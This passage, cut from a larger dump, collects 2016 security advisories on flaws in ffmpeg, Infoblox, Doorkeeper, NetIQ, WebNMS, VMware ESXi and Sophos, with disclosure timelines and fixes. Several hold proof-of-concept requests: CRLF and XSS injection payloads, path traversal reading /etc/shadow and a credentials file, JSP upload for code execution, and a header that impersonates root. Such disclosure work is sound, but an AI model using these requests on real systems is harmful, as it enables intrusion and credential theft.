Because encryption is not used, this would allow a network-level attacker to observe the traffic and compromise the privacy of the applications� users.
This affects applications compiled with the Adobe AIR SDK versions 22.0.0.153 and earlier.
Vendor Response
Adobe has released a fix for this issue on September 13th, 2016 in Adobe AIR SDK v23.0.0.257. Developers should update and rebuild their application using the latest SDK.
References
Adobe Security Bulletin: ASPB16-31
CVE: CVE-2016-6936
Timeline
2016-06-15: Report submitted to Adobe�s HackerOne program
2016-06-16: Report out of scope for this program, directed to Adobe�s PSIRT
2016-06-16: Submitted via email to Adobe�s PSIRT
2016-06-17: Reply received from PSIRT and a ticket number is assigned
2016-09-09: Response received from the vendor that the fix will be released next week
2016-09-13: Fix released
2016-09-14: Public disclosure"
2466,CVE-2016-6920 ffmpeg exr file Heap Overflow,,CVE-2016-6920,"=======
Product: ffmpeg
Affected Versions: <= 3.1.2
Vulnerability Type: Heap Overflow
Security Risk: High
Credit: Yaoguang Chen of Aliapy unLimit Security Team
Introduction
============
$ ffmpeg_debug_312/bin/ffmpeg -i tiled_with_deeptile_type.exr -y xx.png
ffmpeg version 3.1.2 Copyright (c) 2000-2016 the FFmpeg developers
built with gcc 4.8 (Ubuntu 4.8.4-2ubuntu1~14.04.3)
configuration: --prefix=/home/burningcodes/ffmpeg_debug_312/ --disable-yasm --assert-level=2 --enable-debug=3 --disable-optimizations --disable-asm --disable-stripping
libavutil 55. 28.100 / 55. 28.100
libavcodec 57. 48.101 / 57. 48.101
libavformat 57. 41.100 / 57. 41.100
libavdevice 57. 0.101 / 57. 0.101
libavfilter 6. 47.100 / 6. 47.100
libswscale 4. 1.100 / 4. 1.100
libswresample 2. 1.100 / 2. 1.100
*** Error in `ffmpeg_debug_312/bin/ffmpeg': free(): invalid next size (normal): 0x00000000024a44c0 ***
Aborted (core dumped)
gdb backtrace:
$ gdb ffmpeg_debug_312/bin/ffmpeg /tmp/core.1471448229 -q
Reading symbols from ffmpeg_debug_312/bin/ffmpeg...done.
[New LWP 6771]
[Thread debugging using libthread_db enabled]
Using host libthread_db library ""/lib/x86_64-linux-gnu/libthread_db.so.1"".
Core was generated by `ffmpeg_debug_312/bin/ffmpeg -i tiled_with_deeptile_type.exr -y xx.png'.
Program terminated with signal SIGABRT, Aborted.
#0 0x00007f100f696267 in __GI_raise (sig=sig@entry=0x6)
at ../sysdeps/unix/sysv/linux/raise.c:55
55 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
gdb-peda$ bt
#0 0x00007f100f696267 in __GI_raise (sig=sig@entry=0x6)
at ../sysdeps/unix/sysv/linux/raise.c:55
#1 0x00007f100f697eca in __GI_abort () at abort.c:89
#2 0x00007f100f6d9c53 in __libc_message (do_abort=do_abort@entry=0x1,
fmt=fmt@entry=0x7f100f7f21a8 ""*** Error in `%s': %s: 0x%s *** "")
at ../sysdeps/posix/libc_fatal.c:175
#3 0x00007f100f6e1c69 in malloc_printerr (ptr=<optimized out>,
str=0x7f100f7f2300 ""free(): invalid next size (normal)"", action=0x1)
at malloc.c:4965
#4 _int_free (av=<optimized out>, p=<optimized out>, have_lock=0x0)
at malloc.c:3834
#5 0x00007f100f6e589c in __GI___libc_free (mem=<optimized out>)
at malloc.c:2950
#6 0x00000000013e3039 in av_free (ptr=0x24a44c0) at libavutil/mem.c:239
#7 0x00000000013d149c in av_buffer_default_free (opaque=0x0,
data=0x24a44c0 ""377377360j 24137737737737720^"")
at libavutil/buffer.c:63
#8 0x00000000013d165d in buffer_replace (dst=0x7ffd71aa3180, src=0x0)
at libavutil/buffer.c:119
#9 0x00000000013d169d in av_buffer_unref (buf=0x7ffd71aa3180)
at libavutil/buffer.c:129
#10 0x00000000008184e6 in av_packet_unref (pkt=0x7ffd71aa3180)
at libavcodec/avpacket.c:566
#11 0x000000000069e1bb in ff_img_read_packet (s1=0x248c2c0, pkt=0x7ffd71aa3180)
at libavformat/img2dec.c:502
#12 0x00000000007a4dc1 in ff_read_packet (s=0x248c2c0, pkt=0x7ffd71aa3180)
at libavformat/utils.c:759
#13 0x00000000007a7ef3 in read_frame_internal (s=0x248c2c0, pkt=0x7ffd71aa3460)
at libavformat/utils.c:1457
#14 0x00000000007af3c4 in avformat_find_stream_info (ic=0x248c2c0,
options=0x248d110) at libavformat/utils.c:3475
#15 0x00000000004103f2 in open_input_file (o=0x7ffd71aa37b0,
filename=0x7ffd71aa41c6 ""tiled_with_deeptile_type.exr"")
at ffmpeg_opt.c:1002
#16 0x0000000000419274 in open_files (l=0x248c058, inout=0x1413717 ""input"",
open_file=0x40fa95 <open_input_file>) at ffmpeg_opt.c:3036
#17 0x0000000000419401 in ffmpeg_parse_options (argc=0x5, argv=0x7ffd71aa3d98)
at ffmpeg_opt.c:3073
#18 0x000000000042e8a6 in main (argc=0x5, argv=0x7ffd71aa3d98) at ffmpeg.c:4335
#19 0x00007f100f681a40 in __libc_start_main (main=0x42e7c6 <main>, argc=0x5,
argv=0x7ffd71aa3d98, init=<optimized out>, fini=<optimized out>,
rtld_fini=<optimized out>, stack_end=0x7ffd71aa3d88) at libc-start.c:289
#20 0x00000000004061c9 in _start ()"
2469,[CVE-2016-6484] Infoblox Network Automation CRLF Injection/ HTTP splitting,,CVE-2016-6484,"Exploit Title: [CVE-2016-6484] Infoblox Network Automation CRLF Injection/ HTTP splitting vulnerability
Product: Infoblox Network Automation
Vulnerable Versions: 7.0.1 and all previous versions
Tested Version: 6.9.2
Advisory Publication: 06/09/2016
Vulnerability Type: [CWE-113:] Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)
CVE Reference: CVE-2016-6484
Credit: Alex Haynes
Advisory Details:
(1) Vendor & Product Description
--------------------------------
Vendor:
Infoblox
Product & Version:
Infoblox Network Automation v7.0.1
Vendor URL & Download:
https://www.infoblox.com/products/network-automation
Product Description:
""Infoblox also offers a complementary, powerful network automation platform which enables discovery, switch port management, network change configuration and compliance management for multi-vendor network devices. Automation cuts down administrator workload and reduces risk of network outages due to improper configurations or changes.""
(2) Vulnerability Details:
--------------------------
The login page of netmri is vulnerable to a HTTP splitting/CRLF injection.
https://NETMRISERVER/netmri/config/userAdmin/login.tdf
The POST of the login action contains the following parameters, and the �contentType� parameter can be modified to be reflected in the response header:
skipjackPassword=test&width=100&contentType=application/xml&msg=Please+wait+while+your+credentials+are+validated...&url=%2Fnetmri%2Fconfig%2FuserAdmin%2Flogin.tdf&mode=DO-LOGIN&skipjackUsername=test&multipartFile=&title=Waiting+For+Process&filename=&licenseFile=input.licenseFile&authServerList=192.168.X.X%2C+10.X.X.X
Once we control content-type, we can inject �carriage return� : %0a and �line feed� : %0d characters to break the header and introduce our own, effectively �splitting the response. We can then introduce our own HTML and/or javascript to provoke a HTML injection or cross-site scripting attack.:
skipjackPassword=test&width=100&contentType=%0d%0aContentLength:%2019%0d%0a%0d%0a<html><h1>Injected HTML</h1><script>alert(�xss�);</script><!--</html>
&msg=Please+wait+while+your+credentials+are+validated...&url=%2Fnetmri%2Fconfig%2FuserAdmin%2Flogin.tdf&mode=DO-LOGIN&skipjackUsername=test&multipartFile=&title=Waiting+For+Process&filename=&licenseFile=input.licenseFile&authServerList=192.168.X.X%2C+10.X.X.X
(3) Advisory Timeline:
----------------------
25/01/2016 - First Contact informing vendor of vulnerabilities. No response.
01/02/2016 - Follow up e-mail to inform them of vulnerabilities. Response requesting further information.
01/02/2016 - Information on vulnerabilities sent to vendor. No response.
08/02/2016 - follow up e-mail requesting update. Vendor responds asking us to open a support ticket.
12/02/2016 - Infoblox products out of support so cannot raise ticket. write to vendor to explain situation. No response.
24/02/2016 - Follow up with vendor on vulnerabilities requesting an update.
10/03/2016 - Final follow up to vendor requesting an update. Vendor responds and opens support ticket for vulnerabilities, mentioning they will look into vulnerabilities.
14/03/2016 - vendor responds saying they are able to reproduce vulnerabilities
17/03/2016 - Vendor responds saying some of the vulnerabilities are already fixed in version 7.0.4 but cannot confirm which ones.
05/04/2016 - Request update from vendor on status of vulnerabilities.
12/04/2016 - Vendor responds saying CSRF already fixed in 7.0.1, XSS and HTTP Splitting to be fixed in upcoming 7.1.1 - expected release in summer.
30/06/2016 - Patch 7.1.1 released
06/09/2016 - Public disclosure
(4)Solution:
------------
Upgrade to Version 7.1.1
(5) Credits:
------------
Discovered by Alex Haynes"
2492,[CVE-2016-6582] Doorkeeper gem does not revoke tokens & uses wrong auth/auth method,,CVE-2016-6582,"Good evening everyone,
A security bulletin for all of you.
Software:
--------
Doorkeeper (https://github.com/doorkeeper-gem/doorkeeper)
Description:
----------
Doorkeeper is an OAuth 2 provider for Rails written in Ruby.
Affected Versions:
---------------
1.2.0 - 4.1.0 (all versions but latest patch supporting token revocation)
Fixed Versions:
-------------
4.2.0 or apply this commit[0]
Problem:
--------
Doorkeeper failed to implement OAuth 2.0 Token Revocation[1] (RFC
7009[2]) in the following ways:
1. Public clients making valid, unauthenticated calls to revoke a token
would not have their token revoked
2. Requests were not properly authenticating the *client credentials*
but were, instead, looking at the access token in a second location
3. Because of 2, the requests were also not authorizing confidential
clients' ability to revoke a given token. It should only revoke tokens
that belong to it.
(see [3][4][5][6] for above statements)
The security implication is: OAuth 2.0 clients who ""log out"" a user
expect to have the corresponding access & refresh tokens revoked,
preventing an attacker who may have already hijacked the session from
continuing to impersonate the victim. Because of the bug described
above, this is not the case. As far as OWASP is concerned, this counts
as broken authentication design[7].
MITRE has assigned CVE-2016-6582 due to the security issues raised. An
attacker, thanks to 1, can replay a hijacked session after a victim logs
out/revokes their token. Additionally, thanks to 2 & 3, an attacker via
a compromised confidential client could ""grief"" other clients by
revoking their tokens (albeit this is an exceptionally narrow attack
with little value).
Unless I'm mistaken, all clients (public or confidential) that send
well-formed, RFC 7009 compliant requests are affected by this bug.
Solution:
-------
Modify the controller so if the request comes from a public client
revoke the token without auth/auth. If the client is confidential,
authenticate the client per RFC 6749 Sec. 2.3[8] and authorize its
ownership of the provided token. As per [0].
Timeline:
--------
2016-08-03: Bug discovered
2016-08-03: CVE requested, assigned, privately disclosed to maintainer,
bugfix/patch authored
2016-08-08: Maintainer tweaked patch
2016-08-12: Jonathan Clem ( jclem) also discovered bug and publicly
disclosed[6]
2016-08-18: Patched version 4.2.0 is released
Acknowledgements:
-----------------
Special thanks to the maintainer, Tute Costa (https://github.com/tute),
for quickly collaborating with me to prepare & apply a patch.
References:
----------
[0]:
https://github.com/doorkeeper-gem/doorkeeper/commit/fb938051777a3c9cb071e96fc66458f8f615bd53
[1]: https://github.com/doorkeeper-gem/doorkeeper/pull/374
[2]: https://tools.ietf.org/html/rfc7009#section-2.1
[3]:
https://github.com/doorkeeper-gem/doorkeeper/blob/v4.1.0/app/controllers/doorkeeper/tokens_controller.rb#L13-L35
[4]:
https://github.com/doorkeeper-gem/doorkeeper/blob/master/lib/doorkeeper/helpers/controller.rb#L28-L30
[5]:
https://github.com/doorkeeper-gem/doorkeeper/blob/master/lib/doorkeeper/oauth/token.rb#L5-L23
[6]: https://github.com/doorkeeper-gem/doorkeeper/issues/875
[7]:
https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management
[8]: https://tools.ietf.org/html/rfc6749#section-2.3"
2507,[SYSS-2016-067] NetIQ Access Manager (iManager) - Temporary Second Order Cross-Site Scripting (CWE-79),CWE-79,,"Advisory ID: SYSS-2016-067
Product: Access Manager iManager
Manufacturer: NetIQ
Affected Version(s): 2.7.7.5, 2.7.7.6
Tested Version(s): 2.7.7.5
Vulnerability Type: Temporary Second Order Cross-Site Scripting (CWE-79)
Risk Level: Low
Solution Status: Fixed
Solution Date: 2016-07
Public Disclosure: 2016-08-17
CVE Reference: Not yet assigned
Author of Advisory: Micha Borrmann, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
NetIQ Access Manager is a web access management software that provides
secure access to enterprise and cloud applications.
The manufacturer describes the product as follows (see [1]):
""Access Manager provides a simple yet secure and scalable solution
that can handle all your web access needs. Whether your users are using
their phone or laptop to access internal or cloud based services,
Access Manager keeps it secure while delivering a single sign-on
experience.""
Due to improper input validation, NetIQ Access Manager is vulnerable to
reflected cross-site scripting attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the servlet ""webacc"" of the web access
management software NetIQ Access Manager is prone to reflected cross-
site scripting attacks via the URL parameter ""location"".
This cross-site scripting vulnerability allows an attacker to send a
manipulated link to his victim in order to execute arbitrary JavaScript
code in the context of his victim's web browser.
The vulnerability can be abused to bypass the XSS protection in Google
Chrome, Microsoft Internet Explorer and Edge, because the initial
response is a login form for unauthorized users. After a successful
logon, the previously sent XSS attack vector will be executed in the
web browser.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following URL is an example of an attack vector exploiting the
reflected cross-site scripting vulnerability via the URL parameter
""location"":
https://<HOST>/nps/servlet/webacc?taskId=dev.Empty&merge=dm.GenericTask&location=%2froma%2fjsp%2fadmin%2fview%2fmain.jsp%27;document.location=1/3//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install Service Pack 2
More Information:
https://www.netiq.com/documentation/access-manager-42/accessmanager422-releasenotes/data/accessmanager422-releasenotes.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-05-12: Vulnerability discovered
2016-07 : Service Pack 2 released by manufacturer
2016-08-17: Public disclosure of vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for NetIQ Access Manager
https://www.netiq.com/products/access-manager/
[2] SySS Security Advisory SYSS-2016-067
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-067.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of the SySS GmbH.
E-Mail: micha.borrmann syss de
Public Key:
https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key ID: 0xEDBE26E714EA58760
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en"
2555,"[CVE-2016-6600/1/2/3]: Multiple vulnerabilities (RCE, file download, etc) in WebNMS Framework 5.2 / 5.2 SP1",,CVE-2016-6600,"tl;dr
RCE, file download, weak encryption and user impersonation, all of which
can be exploited by an unauthenticated attacker in WebNMS Framework 5.2
and 5.2 SP1.
A special thanks to Beyond Security and their SSD program, which helped
disclose the vulnerabilities. See their advisory at
https://blogs.securiteam.com/index.php/archives/2712
My full advisory can be seen below, and a copy can be obtained at the
github repo
https://github.com/pedrib/PoC/blob/master/advisories/webnms-5.2-sp1-pwn.txt
Metasploit modules have also been released.
Regards,
Pedro
>> Multiple vulnerabilities in WebNMS Framework Server 5.2 and 5.2 SP1
>> Discovered by Pedro Ribeiro (pedrib gmail com), Agile Information
Security
==========================================================================
Disclosure: 04/07/2016 / Last updated: 08/08/2016
>> Background on the affected product:
""WebNMS is an industry-leading framework for building network management
applications. With over 25,000 deployments worldwide and in every Tier 1
Carrier, network equipment providers and service providers can
customize, extend and rebrand WebNMS as a comprehensive Element
Management System (EMS) or Network Management System (NMS).
NOC Operators, Architects and Developers can customize the functional
modules to fit their domain and network. Functional modules include
Fault Correlation, Performance KPIs, Device Configuration, Service
Provisioning and Security. WebNMS supports numerous Operating Systems,
Application Servers, and databases.""
>> Summary:
WebNMS contains three critical vulnerabilities that can be exploited by
an unauthenticated attacker: one directory traversal that can be used to
achieve remote code execution, another directory traversal that can be
abused to download any text file in the system and the possibility to
impersonate any user in the system. In addition, WebNMS also stores the
user passwords in a file with a weak obfuscation algorithm that can be
easily reversed.
A special thanks to the SecuriTeam Secure Disclosure programme (SSD),
which performed the disclosure in a responsible manner to the affected
vendor. This advisory can be seen in their blog at
https://blogs.securiteam.com/index.php/archives/2712
>> Technical details:
#1
Vulnerability: Directory traversal in file upload functionality (leading
to remote code execution)
CVE-2016-6600
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker. See below
for other constraints.
Affected versions: unknown, at least 5.2 and 5.2 SP1
The FileUploadServlet has a directory traversal vulnerability, that
allows an unauthenticated attacker to upload a JSP file that executes on
the server.
To exploit this vulnerability, simply POST as per the proof of concept
below. The directory traversal is in the ""fileName"" parameter.
POST /servlets/FileUploadServlet?fileName=../jsp/Login.jsp HTTP/1.1
<JSP payload here>
There are two things to keep in mind for the upload to be successful:
- Only text files can be uploaded, binary files will be mangled.
- In order to achieve code execution without authentication, the files
need to be dropped in ../jsp/ but they can only have the following
names: either Login.jsp or a WebStartXXX.jsp, where XXX is any string of
any length.
#2
Vulnerability: Directory traversal in file download functionality
CVE-2016-6601
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker. Only text
files can be downloaded properly, any binary file will get mangled by
the servlet and downloaded incorrectly.
Affected versions: unknown, at least 5.2 and 5.2 SP1
The FetchFile servlet has a directory traversal vulnerability that can
be abused by an unauthenticated attacker to download arbitrary files
from the WebNMS host. The vulnerable parameter is ""fileName"" and a proof
of concept is shown below.
GET /servlets/FetchFile?fileName=../../../etc/shadow
#3
Vulnerability: Weak obfuscation algorithm used to store passwords
CVE-2016-6602
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker.
Affected versions: unknown, at least 5.2 and 5.2 SP1
The ./conf/securitydbData.xml file (in the WebNMS WEB-INF directory)
contains entries with all the usernames and passwords in the server:
<DATA ownername=""NULL"" password=""e8c89O1f"" username=""guest""/>
<DATA ownername=""NULL"" password=""d7963B4t"" username=""root""/>
The algorithm used to obfuscate is convoluted but easy to reverse
engineer. The passwords above are ""guest"" for the ""guest"" user and
""admin"" for the ""root"" user. A Metasploit module implementing the
deobfuscation algorithm has been released.
This vulnerability can be combined with #2 and allow an unauthenticated
attacker to obtain credentials for all user accounts:
GET /servlets/FetchFile?fileName=conf/securitydbData.xml
#4
Vulnerability: User account impersonation / hijacking
CVE-2016-6603
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker.
Affected versions: unknown, at least 5.2 and 5.2 SP1
It is possible to impersonate any user in WebNMS by simply setting the
""UserName"" HTTP header when making a request, which will return a valid
authenticated session cookie. This allows an unauthenticated attacker to
impersonate the superuser (""root"") and perform administrative actions.
The proof of concept is shown below:
GET /servlets/GetChallengeServlet HTTP/1.1
UserName: root
This returns the cookie ""SessionId=0033C8CFFE37EB6093849CBA4BF2CAF3;""
which is a valid, JSESSIONID cookie authenticated as the ""root"" user.
This can then be used to login to the WebNMS Framework Server by simply
setting the cookie and browsing to any page.
>> Fix:
Since the vendor did not respond to any contacts attempted by Beyond
Security and its SSD programme, it is not known whether a fixed version
of WebNMS Framework Server has been released. It is highly recommended
not to expose the server to any untrusted networks (such as the Internet).
================
Agile Information Security Limited
http://www.agileinfosec.co.uk/
>> Enabling secure digital business >>"
2569,[SYSS-2016-063] VMware ESXi 6 - Improper Input Validation (CWE-20),CWE-20,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-063
Product: VMware vSphere Hypervisor (ESXi)
Manufacturer: VMware, Inc.
Affected Version(s): VMware ESXi 6.0.0 build 3380124 (Update 1)
VMware vCenter Server 6.0 U2
Tested Version(s): VMware ESXi 6.0.0 build 3380124 (Update 1)
Vulnerability Type: Improper Input Validation (CWE-20)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2016-07-01
Solution Date: 2016-08-04
Public Disclosure: 2016-08-05
CVE Reference: CVE-2016-5331
Authors of Advisory: Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
VMware vSphere Hypervisor is a type-1 hypervisor for serving virtual
machines.
The manufacturer describes the product as follows (see [1]):
""Virtualize even the most resource-intensive applications with peace of
mind. VMware vSphere Hypervisor is based on VMware ESXi, the hypervisor
architecture that sets the industry standard for reliability and
performance.""
Due to improper input validation, the web server of VMware ESXi 6 is
prone to HTTP response injection attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the web server of VMware ESXi 6 is
vulnerable to HTTP response injection attacks, as arbitrarily supplied
URL parameters are copied in the HTTP header Location of the server
response without sufficient input validation.
Thus, an attacker can create a specially crafted URL with a specific
URL parameter that injects attacker-controlled data to the response
of the VMware ESXi web server.
Depending on the context, this allows different attacks. If
such a URL is visited by a victim, it may for example be possible to
set web browser cookies in the victim's web browser, execute arbitrary
JavaScript code, or poison caches of proxy servers.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following URL is a simple attack vector to illustrate the HTTP
response header injection vulnerability by setting an
attacker-controlled session cookie named ""test"" with the value ""31337""
within the victim's web browser:
https://<HOST>/?syss%0d%0aset-cookie:test=31337%0d%0at=1
The corresponding HTTP GET request and the VMware ESXi web server
response are as follows:
GET /?syss%0d%0aset-cookie:test=31337%0d%0at=1 HTTP/1.1
Host: <HOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
HTTP/1.1 303 See Other
Date: Thu, 30 Jun 2016 15:12:23 GMT
Connection: close
Location: /?syss
set-cookie:test=31337
t=1/
X-Frame-Options: DENY
Content-Length: 0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The manufacturer VMware has fixed the reported security vulnerability
and disclosed detailed information about the issue and a software update
for affected products in its security advisory VMSA-2016-0010 [4].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-07-01: Vulnerability reported to manufacturer
2016-07-01: Manufacturer acknowledges e-mail with SySS security advisory
2016-07-14: Manufacturer further investigates the reported security
issue
2016-07-22: Manufacturer announces disclosure of this security issue
2016-08-04: Public release of VMware security advisory VMSA-2016-0010
and security update
2016-08-05: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for VMware vSphere Hypervisor (ESXi)
https://my.vmware.com/web/vmware/info/slug/datacenter_cloud_infrastructure/vmware_vsphere_hypervisor_esxi/6_0
[2] SySS Security Advisory SYSS-2016-063
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-063.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
[4] VMware Security Advisory VMSA-2016-0010
http://www.vmware.com/in/security/advisories/VMSA-2016-0010.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was independently found and reported by
Matthias Deeg of SySS GmbH, Vladimir Ivanov, Andrey Evlanin, Mikhail
Stepankin, Artem Kondratenko, Arseniy Sharoglazov of Positive
Technologies, Matt Foster of Netcraft Ltd, Eva Esteban Molina of
A2secure and Ammarit Thongthua (see [4]).
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCgAGBQJXpF3hAAoJENmkv2o0rU2rJr0P/RYc3j268fzTLERUG5CvLKYV
HNI1a4p2/Mg0lzc/n1/7aZOzX9eRQe0jVyFkv90/843IWCdofQU3aqLBwFSIsFZP
C9Tv3JYpk4T68uzCIriqxqHgt+qza1evfmPTOP2RHua0iaOOQSohzY/cWo3Uc9Yj
Qag+JmnwPWZJNzkL1i41F6oO6aKurM65XBtmAdKQVQwwJ1WYMpiM3vV71hIq18sO
OSJOgKQQMAR/1U7UVd3IgFIUv4+2mdDPyEdlnzPiTtpmJvZQf8H3k9054auCWBWa
U2WOesD5FsCS4nBmuvlTc+jALlqC2SRRgR1UpiEvXTYYunWrOFustGnj4fFvgg7S
omtMdN8dnWdD6BXZXg2k/yVH0WToVWtwV0meKtSg9b0jOywKBVzoYO19vpchHaz4
/Eyxd8HQHpToM3OgwHagFXosF3TGxwQySPlDHdQD5gYANzDBhS8uQ02Gwx2v9NCX
cC/jbTDUC0fa2qNJL/wwN7unqmrdOkGEYlvTjme6wlDR5axB46GunSH5yNg5OKFl
G1s7lZ+ZbcywBxScLx1k7ITa1tNL3PNet5/Ld6A1hi3yhONmRgkyfgB+YqN04xaR
3b5U6eqnPfm8d52yVPa7zySVc1vN9mrQ87dCmnXWGE9xk++SXoeDLv3PbKrY65Iy
w/x007duLbe7k/xSJ1Ip
=/k7W
-----END PGP SIGNATURE-----"
2570,Sophos Mobile Control EAS Proxy Open Reverse Proxy vulnerability (CVE-2016-6597),,CVE-2016-6597,"Application: Sophos Mobile Control EAS Proxy
Versions Affected: 3.5.0.3
Vendor URL: https://www.sophos.com/
Bugs: Open Reverse Proxy
Sent: 30.06.2016
Reported: 05.07.2016
Vendor response: 13.07.2016
Published BugFix by vendor: 28.07.2016
Date of Public Advisory: 05.08.2016
Reference: Sophos Case #6061906
Author: Tim Kretschmann (Pallas GmbH)
Version and State of report: 0.9 ? PrePublic
Description
1. ADVISORY INFORMATION
Title: Sophos Mobile Control EAS Proxy Open Reverse Proxy vulnerability
Risk: high
Advisory URL:
https://www.pallas.com/advisories/sophos_eas_open_reverse_proxy_vulnerability
Date published: 05.08.2016
Vendors contacted: Sophos
2. VULNERABILITY INFORMATION
Impact: access to any web-resources of the backend mail system, if Lotus
Traveler option is enabled
Remotely Exploitable: Yes
Locally Exploitable: No
CVE: CVE-2016-6597
CVSS Base Score v2: 8.6 / 10
CVSS Base Vector: 3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
3. VULNERABILITY DESCRIPTION
Sophos EAS Proxy is part of the Enterprise Mobility Management (EMM)
platform Sophos Mobile Control, which allows control of mail access for
managed mobile devices.
Anonymous attackers can access any web-resources of the backend mail
system like Microsoft Exchange or IBM Domino, if Lotus Traveler option is
enabled. Brute force attacks against users in the backend mail system are
also possible.
4. VULNERABLE PACKAGES
Sophos Mobile Control EAS Proxy Version 3.5.0.3
Other versions are probably affected too, but they were not checked.
5. SOLUTIONS AND WORKAROUNDS
Solution: Update to ?Sophos Mobile Control EAS Proxy 6.2.0.exe?
Workaround: Disable Lotus Traveler Option if possible, limit access on
web-resources of backend mail system
6. AUTHOR
Tim Kretschmann (Pallas GmbH)
7. TECHNICAL DESCRIPTION
Proof of Concept for IBM Domino
https://<PublicIP_of_EASProxy>:<Port_of_EASProxy>/da.nsf
https://<PublicIP_of_EASProxy>:<Port_of_EASProxy>/dba4.nsf
https://<PublicIP_of_EASProxy>:<Port_of_EASProxy>/homepage.nsf
8. ABOUT Pallas GmbH
Pallas GmbH, located in Germany, provides managed and hosting services
with focus on Security.
Adress: Pallas GmbH, Hermuelheimer Str. 8a, 50321 Bruehl, GERMANY
Phone: 0049.2232.18960
--------------------------------------------------------------------
//// pallas
Pallas GmbH / Hermülheimer Str. 8a / 50321 Brühl
Geschäftsführer: Stephan Sachweh
HR B 52019 Amtsgericht Köln
--------------------------------------------------------------------
Managed Service - Einfach sicher"
2610,[CVE-2016-6480] Double-Fetch Vulnerability in Linux-4.5/drivers/scsi/aacraid/commctrl.c,,CVE-2016-6480,"I found this double-fetch vulnerability when I was doing my research on double-fetch issue analysis, and I�d like to make an announcement here.
